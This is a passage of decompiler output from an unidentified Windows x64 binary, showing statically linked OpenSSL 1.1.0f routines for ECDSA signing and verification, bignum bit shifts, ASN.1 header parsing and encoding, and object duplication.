        goto LABEL_42;
      }
      break;
    }
    v20 = a3;
    if ( sub_140026E90((__int64)*v11, a4) )
      goto LABEL_28;
    v22 = 268;
LABEL_41:
    v18 = 65;
    goto LABEL_42;
  }
  v22 = 250;
  v18 = 3;
LABEL_42:
  sub_140024610(16, 249, v18, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", v22);
LABEL_43:
  sub_140065320(v11);
  v11 = 0i64;
LABEL_44:
  sub_140027BE0((__int64)v8);
  sub_140026A10(v23);
  sub_140026A10(v24);
  sub_140026A10(v7);
  return v11;
}
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);

//----- (0000000140046790) ----------------------------------------------------
__int64 __fastcall sub_140046790(__int64 a1, __int64 a2, unsigned int a3, char *a4, unsigned int a5, __int64 a6)
{
  int v6; // ebx
  unsigned int v7; // esi
  int v12; // eax
  void *Buf2; // [rsp+20h] [rbp-28h] BYREF
  char *v14; // [rsp+28h] [rbp-20h] BYREF
  unsigned int *v15; // [rsp+68h] [rbp+20h] BYREF

  v6 = -1;
  v14 = a4;
  v7 = -1;
  Buf2 = 0i64;
  v15 = (unsigned int *)sub_140065370();
  if ( !v15 )
    return 0xFFFFFFFFi64;
  if ( sub_140066080((__int64 *)&v15, &v14, a5) )
  {
    v12 = sub_140066B30(v15, (unsigned __int8 **)&Buf2);
    v6 = v12;
    if ( v12 == a5 && !memcmp(a4, Buf2, v12) )
      v7 = sub_140065200(a2, a3, (__int64)v15, a6);
  }
  sub_14001DA40(Buf2, v6, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 0x153u);
  sub_140065320((__int64 **)v15);
  return v7;
}

//----- (0000000140046880) ----------------------------------------------------
__int64 __fastcall sub_140046880(_BYTE *a1, int a2, __int64 *a3, std::ios_base *a4)
{
  unsigned int v4; // esi
  _QWORD *v5; // r12
  __int64 *v9; // rbp
  int *v10; // rax
  int *v11; // rbx
  __int64 *jumpbuf_sp; // r15
  int v13; // r14d
  _QWORD *v14; // rax
  __int64 v15; // rax
  int v17; // [rsp+20h] [rbp-68h]
  _QWORD *v18; // [rsp+30h] [rbp-58h]
  _QWORD *v19; // [rsp+38h] [rbp-50h]
  __int64 *v20; // [rsp+40h] [rbp-48h]
  __int64 v21; // [rsp+48h] [rbp-40h]
  _QWORD *v23; // [rsp+A8h] [rbp+20h]

  v4 = -1;
  v5 = 0i64;
  if ( !a4 || (v9 = (__int64 *)sub_14001C740((__int64)a4)) == 0i64 || (v21 = std::ios_base::precision(a4)) == 0 || !a3 )
  {
    sub_140024610(16, 250, 124, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 358);
    return 0xFFFFFFFFi64;
  }
  if ( sub_14001C360((__int64)a4) )
  {
    v10 = (int *)sub_140027CD0();
    v11 = v10;
    if ( !v10 )
    {
      sub_140024610(16, 250, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 369);
      return 0xFFFFFFFFi64;
    }
    sub_140027D40(v10);
    v20 = sub_140027C40(v11);
    v19 = sub_140027C40(v11);
    v23 = sub_140027C40(v11);
    v18 = sub_140027C40(v11);
    if ( v18 )
    {
      jumpbuf_sp = (__int64 *)_except_get_jumpbuf_sp(v9);
      if ( jumpbuf_sp )
      {
        if ( sub_140027160(*a3)
          || sub_1400270E0(*a3)
          || (int)sub_140027600((__int64 *)*a3, jumpbuf_sp) >= 0
          || sub_140027160(a3[1])
          || sub_1400270E0(a3[1])
          || (int)sub_140027600((__int64 *)a3[1], jumpbuf_sp) >= 0 )
        {
          sub_140024610(16, 250, 156, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 391);
          v4 = 0;
          goto LABEL_47;
        }
        if ( sub_14006FDD0(v19, a3[1], jumpbuf_sp, v11) )
        {
          v13 = sub_140027260((__int64)jumpbuf_sp);
          if ( 8 * a2 > v13 )
            a2 = (v13 + 7) / 8;
          if ( sub_140026840(a1, a2, (__int64)v23) )
          {
            if ( 8 * a2 <= v13 || (unsigned int)sub_140047090((__int64)v23, (__int64)v23, 8 - (v13 & 7u)) )
            {
              if ( (unsigned int)sub_140079710((__int64)v20, (__int64)v23, (__int64)v19, (__int64)jumpbuf_sp, v11) )
              {
                if ( (unsigned int)sub_140079710((__int64)v19, *a3, (__int64)v19, (__int64)jumpbuf_sp, v11) )
                {
                  v14 = sub_140022670(v9);
                  v5 = v14;
                  if ( !v14 )
                  {
                    sub_140024610(16, 250, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 428);
                    goto LABEL_47;
                  }
                  if ( !(unsigned int)sub_140022600(
                                        (__FrameHandler3::TryBlockMap *)v9,
                                        v14,
                                        (__int64)v20,
                                        v21,
                                        (__int64)v19,
                                        (__int64)v11) )
                  {
                    sub_140024610(16, 250, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 432);
                    goto LABEL_47;
                  }
                  v15 = sub_140021BD0((__int64)v9);
                  if ( (unsigned int)sub_140022000(v15) == 406 )
                  {
                    if ( !(unsigned int)sub_140022380((__int64)v9, v5) )
                    {
                      sub_140024610(16, 250, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 438);
                      goto LABEL_47;
                    }
                  }
                  else if ( !(unsigned int)sub_140022300((__int64)v9, v5) )
                  {
                    sub_140024610(16, 250, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 446);
                    goto LABEL_47;
                  }
                  if ( (unsigned int)sub_1400798F0((__int64)v20, (__int64)v18, (__int64)jumpbuf_sp, v11) )
                  {
                    v4 = sub_140027600(v20, (__int64 *)*a3) == 0;
                    goto LABEL_47;
                  }
                  v17 = 452;
                }
                else
                {
                  v17 = 423;
                }
              }
              else
              {
                v17 = 418;
              }
            }
            else
            {
              v17 = 413;
            }
          }
          else
          {
            v17 = 408;
          }
        }
        else
        {
          v17 = 397;
        }
        sub_140024610(16, 250, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", v17);
        goto LABEL_47;
      }
      sub_140024610(16, 250, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 384);
    }
    else
    {
      sub_140024610(16, 250, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 378);
    }
LABEL_47:
    sub_140027B60((__int64)v11);
    sub_140027BE0((__int64)v11);
    sub_1400222C0(v5);
    return v4;
  }
  sub_140024610(16, 250, 159, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 363);
  return 0xFFFFFFFFi64;
}
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);

//----- (0000000140046D20) ----------------------------------------------------
__int64 __fastcall sub_140046D20()
{
  int v0; // eax

  return sub_1400417E0((__int64 *)&unk_140143190, v0 - 39);
}
// 140046D2D: variable 'v0' is possibly undefined
// 140046D20: using guessed type __int64 __fastcall sub_140046D20();

//----- (0000000140046D40) ----------------------------------------------------
__int64 __fastcall sub_140046D40(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 40) )
    return sub_140041620((__int64 *)&unk_140143190, (__int64)sub_140046DF0, a1, &dword_1400F6B3C, 1, 0);
  else
    return 1i64;
}
// 1400F6B3C: using guessed type int dword_1400F6B3C;

//----- (0000000140046D90) ----------------------------------------------------
__int64 __fastcall sub_140046D90(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 40) = a2;
  return 1i64;
}

//----- (0000000140046DA0) ----------------------------------------------------
__int64 __fastcall sub_140046DA0(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 40) )
    return sub_140041620((__int64 *)&unk_140143190, (__int64)sub_140046DF0, a1, &dword_1400F6B3C, 1, 1);
  else
    return 1i64;
}
// 1400F6B3C: using guessed type int dword_1400F6B3C;

//----- (0000000140046DF0) ----------------------------------------------------
__int64 sub_140046DF0()
{
  return sub_140041580((__int64 *)&unk_140143190);
}

//----- (0000000140046E10) ----------------------------------------------------
int sub_140046E10()
{
  int result; // eax

  if ( dword_1401431A0 )
  {
    dword_1401431A0 = 0;
    return WSACleanup();
  }
  return result;
}
// 1401431A0: using guessed type int dword_1401431A0;

//----- (0000000140046E40) ----------------------------------------------------
__int64 __fastcall sub_140046E40(__int64 a1, __int64 *a2, int a3)
{
  int v3; // eax
  __int64 result; // rax
  int v7; // ebp
  int v8; // edi
  __int64 v9; // r10
  char *v10; // r14
  int v11; // eax
  int v12; // eax
  __int64 v13; // rdx
  _QWORD *v14; // rcx
  int v15; // eax
  __int64 v16; // r9
  char *v17; // r8
  __int64 v18; // r10
  unsigned __int64 v19; // rdx

  if ( a3 >= 0 )
  {
    v7 = a3 / 64;
    v8 = a3 % 64;
    result = (__int64)sub_140027B30(a1, a3 / 64 + *((_DWORD *)a2 + 2) + 1);
    if ( result )
    {
      *(_DWORD *)(a1 + 16) = *((_DWORD *)a2 + 4);
      v9 = *a2;
      v10 = *(char **)a1;
      *(_QWORD *)(*(_QWORD *)a1 + 8i64 * (v7 + *((_DWORD *)a2 + 2))) = 0i64;
      v11 = *((_DWORD *)a2 + 2);
      if ( v8 )
      {
        v15 = v11 - 1;
        v16 = v15;
        if ( v15 >= 0 )
        {
          v17 = &v10[8 * v7 + 8 + 8 * v15];
          v18 = v9 - (8i64 * v7 + 8) - (_QWORD)v10;
          do
          {
            v19 = *(_QWORD *)&v17[v18];
            v17 -= 8;
            *((_QWORD *)v17 + 1) |= v19 >> (64 - (unsigned __int8)v8);
            --v16;
            *(_QWORD *)v17 = v19 << v8;
          }
          while ( v16 >= 0 );
        }
      }
      else
      {
        v12 = v11 - 1;
        v13 = v12;
        if ( v12 >= 0 )
        {
          v14 = (_QWORD *)(v9 + 8i64 * v12);
          do
          {
            --v13;
            *(_QWORD *)&v10[8i64 * v7 - v9 + (_QWORD)v14] = *v14;
            --v14;
          }
          while ( v13 >= 0 );
        }
      }
      memset(v10, 0, 8i64 * v7);
      *(_DWORD *)(a1 + 8) = v7 + *((_DWORD *)a2 + 2) + 1;
      sub_1400278D0(a1);
      return 1i64;
    }
  }
  else
  {
    sub_140024610(v3 - 53, v3 + 89, v3 + 63, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_shift.c", 93);
    return 0i64;
  }
  return result;
}
// 140046E6D: variable 'v3' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140046FD0) ----------------------------------------------------
__int64 __fastcall sub_140046FD0(__int64 a1, __int64 a2)
{
  __int64 *v5; // r9
  unsigned __int64 v6; // rdx
  int v7; // r10d
  _QWORD *v8; // r8
  __int64 v9; // rcx

  if ( a1 == a2 )
  {
    if ( !sub_140027B30(a1, *(_DWORD *)(a2 + 8) + 1) )
      return 0i64;
  }
  else
  {
    *(_DWORD *)(a1 + 16) = *(_DWORD *)(a2 + 16);
    if ( !sub_140027B30(a1, *(_DWORD *)(a2 + 8) + 1) )
      return 0i64;
    *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
  }
  v5 = *(__int64 **)a2;
  v6 = 0i64;
  v7 = 0;
  v8 = *(_QWORD **)a1;
  if ( *(int *)(a2 + 8) > 0 )
  {
    do
    {
      v9 = *v5++;
      ++v7;
      *v8++ = v6 | (2 * v9);
      v6 = (unsigned __int64)v9 >> 63;
    }
    while ( v7 < *(_DWORD *)(a2 + 8) );
    if ( v9 < 0 )
    {
      *v8 = 1i64;
      ++*(_DWORD *)(a1 + 8);
    }
  }
  return 1i64;
}

//----- (0000000140047090) ----------------------------------------------------
__int64 __fastcall sub_140047090(__int64 a1, __int64 a2, int a3)
{
  int v3; // eax
  __int64 result; // rax
  int v8; // r14d
  int v9; // r15d
  int v10; // ebp
  int v11; // eax
  int v12; // r12d
  __int64 *v13; // r9
  unsigned __int64 *v14; // r8
  int v15; // ecx
  __int64 v16; // rax
  unsigned __int64 v17; // r10
  int v18; // r11d
  _QWORD *v19; // r8
  unsigned __int64 v20; // rdx
  unsigned __int64 v21; // r10

  if ( a3 < 0 )
  {
    sub_140024610(v3 - 45, v3 + 98, v3 + 71, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_shift.c", 132);
    return 0i64;
  }
  v8 = a3 / 64;
  v9 = 64 - a3 % 64;
  v10 = a3 % 64;
  v11 = *(_DWORD *)(a2 + 8);
  if ( a3 / 64 < v11 && v11 )
  {
    v12 = (int)(63 - a3 + sub_140027260(a2)) / 64;
    if ( a1 == a2 )
    {
      if ( !a3 )
        return 1i64;
    }
    else
    {
      result = (__int64)sub_140027B30(a1, v12);
      if ( !result )
        return result;
      *(_DWORD *)(a1 + 16) = *(_DWORD *)(a2 + 16);
    }
    v13 = *(__int64 **)a1;
    v14 = (unsigned __int64 *)(*(_QWORD *)a2 + 8i64 * v8);
    v15 = *(_DWORD *)(a2 + 8) - v8;
    *(_DWORD *)(a1 + 8) = v12;
    if ( v10 )
    {
      v17 = *v14;
      v18 = v15 - 1;
      v19 = v14 + 1;
      if ( v15 != 1 )
      {
        do
        {
          ++v19;
          v20 = v17 >> v10;
          v17 = *(v19 - 1);
          *v13++ = v20 | (v17 << v9);
          --v18;
        }
        while ( v18 );
      }
      v21 = v17 >> v10;
      if ( v21 )
        *v13 = v21;
    }
    else
    {
      for ( ; v15; --v15 )
      {
        v16 = *v14++;
        *v13++ = v16;
      }
    }
    if ( !*(_DWORD *)(a1 + 8) )
      *(_DWORD *)(a1 + 16) = 0;
    return 1i64;
  }
  sub_140027560(a1, 0i64);
  return 1i64;
}
// 1400470C1: variable 'v3' is possibly undefined

//----- (0000000140047230) ----------------------------------------------------
__int64 __fastcall sub_140047230(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  int v5; // esi
  __int64 v6; // r14
  int v7; // ebp
  int v8; // esi
  __int64 v9; // rcx
  __int64 v10; // r9
  unsigned __int64 v11; // rdx
  unsigned __int64 v12; // r8
  unsigned __int64 v13; // rdx
  unsigned __int64 *v14; // rdx
  __int64 v15; // r14
  unsigned __int64 v16; // rcx

  if ( sub_140027160(a2) )
  {
    sub_140027560(a1, 0i64);
    return 1i64;
  }
  v5 = *(_DWORD *)(a2 + 8);
  v6 = *(_QWORD *)a2;
  v7 = v5 - 1;
  v8 = v5 - (*(_QWORD *)(*(_QWORD *)a2 + 8i64 * (v5 - 1)) == 1i64);
  if ( a2 != a1 )
  {
    result = (__int64)sub_140027B30(a1, v8);
    if ( !result )
      return result;
    *(_DWORD *)(a1 + 16) = *(_DWORD *)(a2 + 16);
  }
  v9 = *(_QWORD *)a1;
  v10 = v7;
  v11 = *(_QWORD *)(v6 + 8i64 * v7);
  v12 = -(__int64)((v11 & 1) != 0) & 0x8000000000000000ui64;
  v13 = v11 >> 1;
  if ( v13 )
    *(_QWORD *)(v9 + 8i64 * v7) = v13;
  if ( v7 > 0 )
  {
    v14 = (unsigned __int64 *)(v9 + 8i64 * v7);
    v15 = v6 - v9;
    do
    {
      v16 = *(unsigned __int64 *)((char *)v14-- + v15 - 8);
      --v10;
      *v14 = v12 | (v16 >> 1);
      v12 = -(__int64)((v16 & 1) != 0) & 0x8000000000000000ui64;
    }
    while ( v10 > 0 );
  }
  *(_DWORD *)(a1 + 8) = v8;
  if ( !v8 )
    *(_DWORD *)(a1 + 16) = 0;
  return 1i64;
}

//----- (0000000140047350) ----------------------------------------------------
void __fastcall sub_140047350(int *a1)
{
  __int64 v2; // rcx

  if ( a1 )
  {
    v2 = *((_QWORD *)a1 + 1);
    if ( v2 )
    {
      if ( (a1[4] & 0x10) == 0 )
        sub_140023440(v2, *a1);
    }
    sub_140047500((__int64)a1);
  }
}

//----- (0000000140047390) ----------------------------------------------------
int __fastcall sub_140047390(const void **a1, __int64 a2)
{
  size_t v4; // rcx
  int result; // eax

  v4 = *(int *)a1;
  result = v4 - *(_DWORD *)a2;
  if ( (_DWORD)v4 == *(_DWORD *)a2 )
  {
    result = memcmp(a1[1], *(const void **)(a2 + 8), v4);
    if ( !result )
      return *((_DWORD *)a1 + 1) - *(_DWORD *)(a2 + 4);
  }
  return result;
}

//----- (00000001400473E0) ----------------------------------------------------
__int64 __fastcall sub_1400473E0(__int64 a1, __int64 a2)
{
  if ( !a2 )
    return 0i64;
  *(_DWORD *)(a1 + 4) = *(_DWORD *)(a2 + 4);
  if ( !(unsigned int)sub_1400475D0(a1, *(_BYTE **)(a2 + 8), *(_DWORD *)a2) )
    return 0i64;
  *(_DWORD *)(a1 + 16) &= 0x80u;
  *(_DWORD *)(a1 + 16) |= *(_DWORD *)(a2 + 16) & 0xFFFFFF7F;
  return 1i64;
}

//----- (0000000140047450) ----------------------------------------------------
__int64 __fastcall sub_140047450(__int64 a1)
{
  _DWORD *v3; // rax
  __int64 v4; // rbx

  if ( !a1 )
    return 0i64;
  v3 = sub_14001DC20(0x18ui64);
  v4 = (__int64)v3;
  if ( v3 )
  {
    v3[1] = 4;
    if ( (unsigned int)sub_1400473E0((__int64)v3, a1) )
    {
      return v4;
    }
    else
    {
      sub_140047500(v4);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(13, 130, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_lib.c", 311);
    return 0i64;
  }
}

//----- (0000000140047500) ----------------------------------------------------
void __fastcall sub_140047500(__int64 a1)
{
  int v2; // edi

  if ( a1 )
  {
    v2 = *(_DWORD *)(a1 + 16) & 0x80;
    if ( (*(_DWORD *)(a1 + 16) & 0x10) == 0 )
      sub_14001D930(*(void **)(a1 + 8));
    if ( !v2 )
      sub_14001D930((void *)a1);
  }
}

//----- (0000000140047570) ----------------------------------------------------
_DWORD *__fastcall sub_140047570()
{
  int v0; // eax
  _DWORD *result; // rax

  result = sub_14001DC20((unsigned int)(v0 - 32));
  if ( result )
  {
    result[1] = 4;
  }
  else
  {
    sub_140024610(13, 130, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_lib.c", 311);
    return 0i64;
  }
  return result;
}
// 14004758A: variable 'v0' is possibly undefined

//----- (00000001400475D0) ----------------------------------------------------
__int64 __fastcall sub_1400475D0(__int64 a1, _BYTE *a2, int a3)
{
  int v3; // ebx
  __int64 result; // rax
  unsigned int v7; // ebx
  _BYTE *i; // rax
  void *v9; // rbp
  void *v10; // rax

  v3 = a3;
  if ( a3 < 0 )
  {
    if ( !a2 )
      return 0i64;
    v7 = 0;
    for ( i = a2; *i; ++v7 )
    {
      if ( v7 >= 0x80000000 )
        break;
      ++i;
    }
    v3 = v7 & 0x7FFFFFFF;
  }
  if ( *(_DWORD *)a1 > v3 && *(_QWORD *)(a1 + 8)
    || (v9 = *(void **)(a1 + 8),
        v10 = sub_14001D970(v9, v3 + 1, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_lib.c", 0x115u),
        (*(_QWORD *)(a1 + 8) = v10) != 0i64) )
  {
    *(_DWORD *)a1 = v3;
    if ( a2 )
    {
      memmove(*(void **)(a1 + 8), a2, v3);
      *(_BYTE *)(v3 + *(_QWORD *)(a1 + 8)) = 0;
    }
    return 1i64;
  }
  else
  {
    sub_140024610(13, 186, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_lib.c", 279);
    result = 0i64;
    *(_QWORD *)(a1 + 8) = v9;
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400476D0) ----------------------------------------------------
void __fastcall sub_1400476D0(__int64 a1, __int64 a2, int a3)
{
  sub_14001D930(*(void **)(a1 + 8));
  *(_QWORD *)(a1 + 8) = a2;
  *(_DWORD *)a1 = a3;
}

//----- (0000000140047720) ----------------------------------------------------
_DWORD *__fastcall sub_140047720(int a1)
{
  int v1; // eax
  _DWORD *result; // rax

  result = sub_14001DC20((unsigned int)(v1 - 24));
  if ( result )
  {
    result[1] = a1;
  }
  else
  {
    sub_140024610(13, 130, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_lib.c", 311);
    return 0i64;
  }
  return result;
}
// 140047738: variable 'v1' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140047780) ----------------------------------------------------
__int64 __fastcall sub_140047780(_BYTE **a1, int *a2, int *a3, int *a4, int a5)
{
  _BYTE *v6; // rbx
  int v10; // r9d
  int v11; // esi
  int v12; // r10d
  int v13; // eax
  int v14; // r8d
  char *v15; // rbx
  char v16; // al
  int i; // edx
  char v18; // al
  bool v19; // zf
  char v20; // al
  int v21; // edi
  _BYTE *v22; // rbx
  unsigned int v23; // edx
  int v24; // eax

  v6 = *a1;
  if ( !a5 )
    goto LABEL_30;
  v10 = a5 - 1;
  v11 = *v6 & 0x20;
  v12 = *v6 & 0xC0;
  v13 = *v6 & 0x1F;
  v14 = 0;
  v15 = v6 + 1;
  if ( v13 == 31 )
  {
    if ( a5 == 1 )
      goto LABEL_30;
    v16 = *v15;
    for ( i = 0; *v15 < 0; v16 = *v15 )
    {
      ++v15;
      i = (i << 7) | v16 & 0x7F;
      if ( !--v10 || i > 0xFFFFFF )
        goto LABEL_30;
    }
    v18 = *v15++;
    v13 = (i << 7) | v18 & 0x7F;
    v19 = --v10 == 0;
  }
  else
  {
    v19 = a5 == 1;
  }
  if ( v19 )
    goto LABEL_30;
  *a3 = v13;
  *a4 = v12;
  if ( v10 < 1 )
    goto LABEL_30;
  v20 = *v15;
  if ( *v15 == (char)0x80 )
  {
    v21 = 1;
    v22 = v15 + 1;
    goto LABEL_25;
  }
  v21 = 0;
  v23 = v20 & 0x7F;
  v22 = v15 + 1;
  if ( v20 >= 0 )
  {
    v14 = v20 & 0x7F;
    goto LABEL_24;
  }
  if ( v10 - 1 < (int)(v23 + 1) )
    goto LABEL_30;
  if ( (v20 & 0x7F) != 0 )
  {
    do
    {
      if ( *v22 )
        break;
      ++v22;
      --v23;
    }
    while ( v23 );
  }
  if ( v23 > 4 )
    goto LABEL_30;
  if ( v23 )
  {
    do
    {
      v24 = (unsigned __int8)*v22++;
      v14 = v24 | (v14 << 8);
      --v23;
    }
    while ( v23 );
LABEL_24:
    if ( (unsigned int)v14 <= 0x7FFFFFFF )
      goto LABEL_25;
LABEL_30:
    sub_140024610(13, 114, 123, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_lib.c", 101);
    return 128i64;
  }
LABEL_25:
  *a2 = v14;
  if ( v21 && (v11 & 0x20) == 0 )
    goto LABEL_30;
  if ( v14 > (__int64)&(*a1)[a5 - (_QWORD)v22] )
  {
    sub_140024610(13, 114, 155, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn1_lib.c", 91);
    v11 |= 0x80u;
  }
  *a1 = v22;
  return v11 | (unsigned int)v21;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140047960) ----------------------------------------------------
__int64 __fastcall sub_140047960(int a1, int a2, int a3)
{
  int v3; // eax
  int v5; // eax
  int i; // ecx

  v3 = 1;
  if ( a2 < 0 )
    return 0xFFFFFFFFi64;
  if ( a3 >= 31 )
  {
    do
    {
      a3 >>= 7;
      ++v3;
    }
    while ( a3 > 0 );
  }
  if ( a1 == 2 )
  {
    v5 = v3 + 3;
  }
  else
  {
    v5 = v3 + 1;
    if ( a2 > 127 )
    {
      for ( i = a2; i > 0; i >>= 8 )
        ++v5;
    }
  }
  if ( v5 >= 0x7FFFFFFF - a2 )
    return 0xFFFFFFFFi64;
  else
    return (unsigned int)(a2 + v5);
}
// 140047993: conditional instruction was optimized away because edx.4>=80

//----- (00000001400479B0) ----------------------------------------------------
__int64 __fastcall sub_1400479B0(_WORD **a1)
{
  _WORD *v1; // rax

  v1 = *a1;
  *v1 = 0;
  *a1 = v1 + 1;
  return 2i64;
}

//----- (00000001400479D0) ----------------------------------------------------
char __fastcall sub_1400479D0(_BYTE **a1, int a2, int a3, int a4, char a5)
{
  _BYTE *v5; // r10
  _BYTE *v9; // rax
  unsigned int v10; // ebx
  int v11; // r9d
  _BYTE *v12; // r10
  _BYTE *v13; // r10
  int i; // ecx
  __int64 v15; // rdi
  int v16; // ebx
  _BYTE *v17; // rdx
  int j; // eax
  __int64 v19; // rcx
  _BYTE *v20; // r10

  v5 = *a1;
  LODWORD(v9) = a5 & 0xC0;
  v10 = (unsigned int)v9 | (a2 != 0 ? 0x20 : 0);
  v11 = 0;
  if ( a4 >= 31 )
  {
    *v5 = v10 | 0x1F;
    LODWORD(v9) = 0;
    v13 = v5 + 1;
    for ( i = a4; i > 0; i >>= 7 )
      LODWORD(v9) = (_DWORD)v9 + 1;
    v15 = (int)v9;
    if ( (int)v9 > 0 )
    {
      v16 = (_DWORD)v9 - 1;
      v17 = &v13[(int)v9];
      do
      {
        --v17;
        LODWORD(v9) = (_DWORD)v9 - 1;
        *v17 = a4 & 0x7F;
        if ( (_DWORD)v9 != v16 )
          *v17 = a4 & 0x7F | 0x80;
        a4 >>= 7;
      }
      while ( (int)v9 > 0 );
    }
    v12 = &v13[v15];
  }
  else
  {
    *v5 = v10 | a4 & 0x1F;
    v12 = v5 + 1;
  }
  if ( a2 == 2 )
  {
    *v12 = 0x80;
    *a1 = v12 + 1;
  }
  else if ( a3 > 127 )
  {
    for ( j = a3; j > 0; j >>= 8 )
      ++v11;
    v19 = v11;
    LOBYTE(v9) = v11 | 0x80;
    *v12 = v11 | 0x80;
    v20 = v12 + 1;
    if ( v11 > 0 )
    {
      v9 = &v20[v11];
      do
      {
        --v9;
        --v11;
        *v9 = a3;
        a3 >>= 8;
      }
      while ( v11 > 0 );
    }
    *a1 = &v20[v19];
  }
  else
  {
    *v12 = a3;
    *a1 = v12 + 1;
  }
  return (char)v9;
}
// 140047A2A: conditional instruction was optimized away because r11d.4>=1F
// 140047AAA: conditional instruction was optimized away because r8d.4>=80

//----- (0000000140047B00) ----------------------------------------------------
void __fastcall sub_140047B00(__int64 a1, int a2)
{
  if ( a1 )
  {
    if ( (*(_BYTE *)(a1 + 16) & 0x10) == 0 )
      sub_14001D930(*(void **)(a1 + 8));
    if ( !a2 )
      sub_14001D930((void *)a1);
  }
}

//----- (0000000140047B60) ----------------------------------------------------
int __fastcall sub_140047B60(__int64 a1, __int64 a2)
{
  int result; // eax

  result = *(_DWORD *)(a1 + 20) - *(_DWORD *)(a2 + 20);
  if ( !result )
    return memcmp(*(const void **)(a1 + 24), *(const void **)(a2 + 24), *(int *)(a1 + 20));
  return result;
}

//----- (0000000140047B90) ----------------------------------------------------
__int64 __fastcall sub_140047B90(__int64 a1)
{
  _DWORD *v3; // rax
  __int64 v4; // rdi
  void *v5; // rax
  _BYTE *v6; // rcx
  void *v7; // rax
  void *v8; // rax

  if ( !a1 )
    return 0i64;
  if ( (*(_BYTE *)(a1 + 32) & 1) == 0 )
    return a1;
  v3 = sub_14003F580();
  v4 = (__int64)v3;
  if ( v3 )
  {
    v3[8] = *(_DWORD *)(a1 + 32) | 0xD;
    if ( *(int *)(a1 + 20) > 0 )
    {
      v5 = sub_14003BAB0(*(const void **)(a1 + 24), *(int *)(a1 + 20));
      *(_QWORD *)(v4 + 24) = v5;
      if ( !v5 )
        goto LABEL_13;
    }
    if ( ((*(_DWORD *)(v4 + 20) = *(_DWORD *)(a1 + 20),
           *(_DWORD *)(v4 + 16) = *(_DWORD *)(a1 + 16),
           (v6 = *(_BYTE **)(a1 + 8)) == 0i64)
       || (v7 = sub_14003BB60(v6), (*(_QWORD *)(v4 + 8) = v7) != 0i64))
      && (!*(_QWORD *)a1 || (v8 = sub_14003BB60(*(_BYTE **)a1), (*(_QWORD *)v4 = v8) != 0i64)) )
    {
      return v4;
    }
    else
    {
LABEL_13:
      sub_14003F4D0(v4);
      sub_140024610(8, 101, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\objects\\obj_lib.c", 54);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(8, 101, 13, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\objects\\obj_lib.c", 29);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140047CD0) ----------------------------------------------------
void __fastcall sub_140047CD0(std::ios_base *a1)
{
  void **v1; // rax

  v1 = (void **)std::ios_base::precision(a1);
  sub_140062DA0(v1);
}

//----- (0000000140047CF0) ----------------------------------------------------
__int64 __fastcall sub_140047CF0(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  if ( *(_QWORD *)(a1 + 32) )
    return sub_140049330(*(_QWORD *)(a1 + 32), *(_QWORD *)(a2 + 32), *(_QWORD *)(a2 + 16) == (_QWORD)&unk_1400F6E10);
  result = sub_14002D430();
  *(_QWORD *)(a1 + 32) = result;
  if ( result )
    return sub_140049330(*(_QWORD *)(a1 + 32), *(_QWORD *)(a2 + 32), *(_QWORD *)(a2 + 16) == (_QWORD)&unk_1400F6E10);
  return result;
}

//----- (0000000140047D60) ----------------------------------------------------
__int64 __fastcall sub_140047D60(charNode *a1)
{
  __int64 v1; // rax

  v1 = *((_QWORD *)a1 + 4);
  if ( v1 && *(_QWORD *)(v1 + 8) && *(_QWORD *)(v1 + 16) )
    return 0i64;
  else
    return charNode::raw_length(a1);
}

